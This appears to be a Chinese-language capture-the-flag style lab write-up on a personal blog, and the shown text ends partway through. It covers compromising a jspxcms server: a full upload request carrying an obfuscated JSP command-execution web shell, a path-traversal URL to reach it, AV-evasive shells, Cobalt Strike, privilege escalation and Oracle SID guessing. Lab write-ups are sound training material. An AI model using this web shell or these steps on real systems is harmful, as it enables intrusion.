@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Cyberstrikelab Diamond Writeup - L1nq Blog</title><meta name="author" content="L1nq">
+<meta name="description" content="Cyberstrikelab Diamond Writeup"><meta name="keywords" content='Cyberstrikelab'>
+  <meta itemprop="name" content="Cyberstrikelab Diamond Writeup">
+  <meta itemprop="description" content="Cyberstrikelab Diamond Writeup">
+  <meta itemprop="datePublished" content="2025-03-31T15:49:59+00:00">
+  <meta itemprop="dateModified" content="2026-05-01T12:09:56+08:00">
+  <meta itemprop="wordCount" content="245">
+  <meta itemprop="image" content="https://sw1mblu3.fun/1.jpg">
+  <meta itemprop="keywords" content="Cyberstrikelab"><meta property="og:url" content="https://sw1mblu3.fun/posts/cslab-diamond/">
+  <meta property="og:site_name" content="L1nq Blog">
+  <meta property="og:title" content="Cyberstrikelab Diamond Writeup">
+  <meta property="og:description" content="Cyberstrikelab Diamond Writeup">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-03-31T15:49:59+00:00">
+    <meta property="article:modified_time" content="2026-05-01T12:09:56+08:00">
+    <meta property="article:tag" content="Cyberstrikelab">
+    <meta property="og:image" content="https://sw1mblu3.fun/1.jpg">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://sw1mblu3.fun/1.jpg">
+  <meta name="twitter:title" content="Cyberstrikelab Diamond Writeup">
+  <meta name="twitter:description" content="Cyberstrikelab Diamond Writeup">
+<meta name="application-name" content="L1nq Blog">
+<meta name="apple-mobile-web-app-title" content="L1nq Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://sw1mblu3.fun/posts/cslab-diamond/" title="Cyberstrikelab Diamond Writeup - L1nq Blog" /><link rel="prev" type="text/html" href="https://sw1mblu3.fun/posts/cslab-pearl/" title="Cyberstrikelab Pearl Writeup" /><link rel="next" type="text/html" href="https://sw1mblu3.fun/posts/hackthebox%E8%B5%9B%E5%AD%A3%E9%9D%B6%E6%9C%BA-haze/" title="HackTheBox Haze Writeup" /><link rel="alternate" type="text/markdown" href="https://sw1mblu3.fun/posts/cslab-diamond/index.md" title="Cyberstrikelab Diamond Writeup - L1nq Blog"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Cyberstrikelab Diamond Writeup",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/sw1mblu3.fun\/posts\/cslab-diamond\/"
+    },"image": ["https:\/\/sw1mblu3.fun\/1.jpg"],"genre": "posts","keywords": "Cyberstrikelab","wordcount":  245 ,
+    "url": "https:\/\/sw1mblu3.fun\/posts\/cslab-diamond\/","datePublished": "2025-03-31T15:49:59+00:00","dateModified": "2026-05-01T12:09:56+08:00","license": "2026","publisher": {
+      "@type": "Organization",
+      "name": "L1nq Blog","logo": "https:\/\/sw1mblu3.fun\/1.jpg"},"author": {
+        "@type": "Person",
+        "name": "L1nq"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="L1nq Blog"><span class="header-title-text">L1nq Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/links/"><i class="fa-solid fa-link fa-sm" aria-hidden="true"></i> Links</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" role="button" aria-label="Switch Theme" title="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="L1nq Blog"><span class="header-title-text">L1nq Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="theme-switch" role="button" aria-label="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></div>
+      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/links/"><i class="fa-solid fa-link fa-sm" aria-hidden="true"></i> Links</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item"><a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item menu-system"></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>Cyberstrikelab Diamond Writeup</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="https://github.com/L1nq0" title="Author" target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img class="avatar" src='/1.jpg' alt="L1nq" height="16" width="16">&nbsp;L1nq</a></span><span class="post-included-in">&nbsp;included in <a href="/categories/pentest-lab/" class="post-category" title="Category - Pentest Lab"><i class="fa-regular fa-folder" aria-hidden="true"></i> Pentest Lab</a></span></div><div class="post-meta-line"><span title="published on 2025-03-31 15:49:59"><i class="fa-solid fa-calendar-days me-1" aria-hidden="true"></i><time datetime="2025-03-31">2025-03-31</time></span>&nbsp;<span title="Updated on 2026-05-01 12:09:56"><i class="fa-regular fa-calendar-check me-1" aria-hidden="true"></i><time datetime="2026-05-01">2026-05-01</time></span>&nbsp;<span title="245 words"><i class="fa-solid fa-pencil-alt me-1" aria-hidden="true"></i>About 300 words</span>&nbsp;<span><i class="fa-regular fa-clock me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
+    </div><div class="content" id="content"><p>Cyberstrikelab Diamond Writeup</p>
+<h1 class="heading-element" id="diamand-打靶记录"><span>「Diamand」 打靶记录</span>
+  <a href="#diamand-%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>扫描发现 8080 端口，访问，是一个内容管理系统
+<img loading="lazy" src='/posts/cslab-diamond/file-20250327195923940.png' alt="/posts/cslab-diamond/file-20250327195923940.png" height="812" width="1533"></p>
+<p><code>Google</code> 检索到了 <code>jspxcms</code> 后台管理路径</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cmscp/login.do</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p><img loading="lazy" src='/posts/cslab-diamond/file-20250330115903523.png' alt="/posts/cslab-diamond/file-20250330115903523.png" height="536" width="1082"></p>
+<p>尝试弱口令无果，转向测试历史漏洞，<code>jspxcms</code> 的历史漏洞应该是蛮多的，找到一个前台文件上传，注册账号 -&gt; 点击设置 -&gt; 稿件发布，可以上传文件
+<img loading="lazy" src='/posts/cslab-diamond/file-20250327203742354.png' alt="/posts/cslab-diamond/file-20250327203742354.png" height="787" width="1324"></p>
+<p>上传木马，POST 包如下</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">POST</span> <span class="o">/</span><span class="n">ueditor</span><span class="err">?</span><span class="n">ueditor</span><span class="o">=</span><span class="bp">true</span><span class="o">&amp;</span><span class="n">action</span><span class="o">=</span><span class="n">uploadimage</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="p">:</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">10.45</span><span class="p">:</span><span class="mi">8080</span>
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">859</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">geckoformboundary9896dee8fae223e579461dec813153ba</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;upfile&#34;</span><span class="p">;</span> <span class="n">filename</span><span class="o">=</span><span class="s2">&#34;1.jsp&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">image</span><span class="o">/</span><span class="n">jpeg</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">contentType</span><span class="o">=</span><span class="s2">&#34;text/html;charset=UTF-8&#34;</span> <span class="n">language</span><span class="o">=</span><span class="s2">&#34;java&#34;</span> <span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s2">&#34;sun.misc.BASE64Decoder&#34;</span> <span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">getParameter</span><span class="p">(</span><span class="s2">&#34;cmd&#34;</span><span class="p">)</span><span class="o">!=</span><span class="n">null</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="n">BASE64Decoder</span> <span class="n">decoder</span> <span class="o">=</span> <span class="n">new</span> <span class="n">BASE64Decoder</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Class</span> <span class="n">c</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="n">forName</span><span class="p">(</span><span class="n">new</span> <span class="ne">String</span><span class="p">(</span><span class="n">decoder</span><span class="o">.</span><span class="n">decodeBuffer</span><span class="p">(</span><span class="s2">&#34;amF5c3lzdGVtcy5lY2hvc2F0ZXM=&#34;</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Process</span> <span class="n">p</span> <span class="o">=</span> <span class="p">(</span><span class="n">Process</span><span class="p">)</span> <span class="n">c</span><span class="o">.</span><span class="n">getMethod</span><span class="p">(</span><span class="s2">&#34;exec&#34;</span><span class="p">,</span> <span class="n">new</span> <span class="n">Class</span><span class="p">[]{</span><span class="ne">String</span><span class="o">.</span><span class="k">class</span><span class="p">})</span><span class="o">.</span><span class="n">invoke</span><span class="p">(</span><span class="n">c</span><span class="o">.</span><span class="n">newInstance</span><span class="p">(),</span> <span class="n">request</span><span class="o">.</span><span class="n">getParameter</span><span class="p">(</span><span class="s2">&#34;cmd&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">getBytes</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">    <span class="n">java</span><span class="o">.</span><span class="n">io</span><span class="o">.</span><span class="n">InputStream</span> <span class="ow">in</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">getInputStream</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="ne">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">byte</span><span class="p">[]</span> <span class="n">b</span> <span class="o">=</span> <span class="n">new</span> <span class="n">byte</span><span class="p">[</span><span class="mi">2048</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">((</span><span class="n">i</span><span class="o">=</span><span class="ow">in</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">b</span><span class="p">))</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="n">out</span><span class="o">.</span><span class="n">print</span><span class="p">(</span><span class="n">new</span> <span class="ne">String</span><span class="p">(</span><span class="n">b</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">out</span><span class="o">.</span><span class="n">print</span><span class="p">(</span><span class="s2">&#34;&lt;/pre&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">geckoformboundary9896dee8fae223e579461dec813153ba</span><span class="o">--</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><p>结果显示生成成功，文件类型为 <code>JSP</code>
+<img loading="lazy" src='/posts/cslab-diamond/file-20250330114035430.png' alt="/posts/cslab-diamond/file-20250330114035430.png" height="499" width="1020"></p>
+<p>访问却是 <code>404</code>，本应该是 <code>403</code>，没有权限访问
+<img loading="lazy" src='/posts/cslab-diamond/file-20250330114515969.png' alt="/posts/cslab-diamond/file-20250330114515969.png" height="274" width="1267"></p>
+<p>根据复现内容继续用路径穿越执行命令，失败，返回 <code>500 or 404</code> ，复现失败。其他漏洞的话，<code>SSRF</code> 漏洞需要搭配才有效果，反序列化根据介绍爆破 <code>Shiro</code> 框架密钥要几个小时，也暂时不去尝试，后台有文件上传漏洞，还得尝试爆破管理员账号密码
+访问，嗯直接跳转进去了？怎么直接通过前台账号进后台了
+<img loading="lazy" src='/posts/cslab-diamond/file-20250330120603399.png' alt="/posts/cslab-diamond/file-20250330120603399.png" height="765" width="1920"></p>
+<p>后台什么信息也没有，左侧栏没有任务交互点，也许是最低权限账户的缘故
+<img loading="lazy" src='/posts/cslab-diamond/file-20250330120706247.png' alt="/posts/cslab-diamond/file-20250330120706247.png" height="385" width="228"></p>
+<p>管理员密码爆破失败，此时卡住了，真去爆破几小时 <code>Shiro</code> 密钥么
+突然想起来之前根据结果判断上传应该是落地了，但返回 <code>404</code> ，有没有可能是木马被杀了，再尝试一下上传有免杀效果的 <code>JSP</code> 马
+使用 <code>ByPassGodzilla</code>生成 <code>JSP</code> 马
+<img loading="lazy" src='/posts/cslab-diamond/file-20250330124750563.png' alt="/posts/cslab-diamond/file-20250330124750563.png" height="230" width="924"></p>
+<p>上传并使用哥斯拉连接，注意连接路径为</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">10.45</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="n">app</span><span class="err">?</span><span class="n">template</span><span class="o">=/../../../../../</span><span class="n">uploads</span><span class="o">/</span><span class="mi">1</span><span class="o">/</span><span class="n">image</span><span class="o">/</span><span class="n">public</span><span class="o">/</span><span class="mi">202503</span><span class="o">/</span><span class="mi">20250330043317</span><span class="n">_28a4yynja8</span><span class="o">.</span><span class="n">jsp</span><span class="err">?</span></span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>连接成功！
+<img loading="lazy" src='/posts/cslab-diamond/file-20250330125105984.png' alt="/posts/cslab-diamond/file-20250330125105984.png" height="626" width="603"></p>
+<p>终于进去了，先看杀软识别，发现 <code>360</code> 和 <code>Defender</code>
+<img loading="lazy" src='/posts/cslab-diamond/file-20250330171154005.png' alt="/posts/cslab-diamond/file-20250330171154005.png" height="364" width="1241"></p>
+<p>上线CS，还是熟悉的掩日，CS 生成 C 文件再免杀
+<img loading="lazy" src='/posts/cslab-diamond/file-20250330130617944.png' alt="/posts/cslab-diamond/file-20250330130617944.png" height="658" width="927">
+<img loading="lazy" src='/posts/cslab-diamond/file-20250330130844651.png' alt="/posts/cslab-diamond/file-20250330130844651.png" height="29" width="1530"></p>
+<p>烂土豆提权
+<img loading="lazy" src='/posts/cslab-diamond/file-20250330131607725.png' alt="/posts/cslab-diamond/file-20250330131607725.png" height="803" width="1541"></p>
+<p>拿到 <code>Flag1</code>
+<img loading="lazy" src='/posts/cslab-diamond/file-20250330171531622.png' alt="/posts/cslab-diamond/file-20250330171531622.png" height="283" width="688"></p>
+<p>登陆 <code>3389</code> 远程桌面
+<img loading="lazy" src='/posts/cslab-diamond/file-20250330171604886.png' alt="/posts/cslab-diamond/file-20250330171604886.png" height="556" width="1025"></p>
+<p>发现 C 盘底下存了一个用户名密码
+<img loading="lazy" src='/posts/cslab-diamond/file-20250331113731644.png' alt="/posts/cslab-diamond/file-20250331113731644.png" height="330" width="704"></p>
+<p>顺手捡下数据库，可拿可不拿</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">net start mysql  //开启 mysql 服务</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p><img loading="lazy" src='/posts/cslab-diamond/file-20250330171441138.png' alt="/posts/cslab-diamond/file-20250330171441138.png" height="124" width="736">
+<img loading="lazy" src='/posts/cslab-diamond/file-20250330173724910.png' alt="/posts/cslab-diamond/file-20250330173724910.png" height="651" width="1443"></p>
+<p><code>stowaway</code> 搭建代理
+<img loading="lazy" src='/posts/cslab-diamond/file-20250331152455108.png' alt="/posts/cslab-diamond/file-20250331152455108.png" height="402" width="862"></p>
+<p><code>Fscan</code> 扫描内网机器，<code>Web</code> 网站应该是 <code>Orable</code> 数据库的默认页面，没有漏洞
+<img loading="lazy" src='/posts/cslab-diamond/file-20250330174927805.png' alt="/posts/cslab-diamond/file-20250330174927805.png" height="585" width="1203"></p>
+<p>拿之前 C 盘找到的账号密码测试 <code>SMB</code> 和 <code>WMI</code> 远程登录，失败；测试 <code>Orable</code> 数据库
+这也是第一次碰到 <code>Orable</code>，边学边打，先用 <code>odat</code> 爆破 <code>SID</code></p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 odat sidguesser -s 172.17.50.33</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p><strong>SID: ORCL</strong>
+<img loading="lazy" src='/posts/cslab-diamond/file-20250330191018940.png' alt="/posts/cslab-diamond/file-20250330191018940.png" height="203" width="1696"></p>
+<p>尝试命令行连接，但怎么连都没反应，可能是本地环境有问题</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
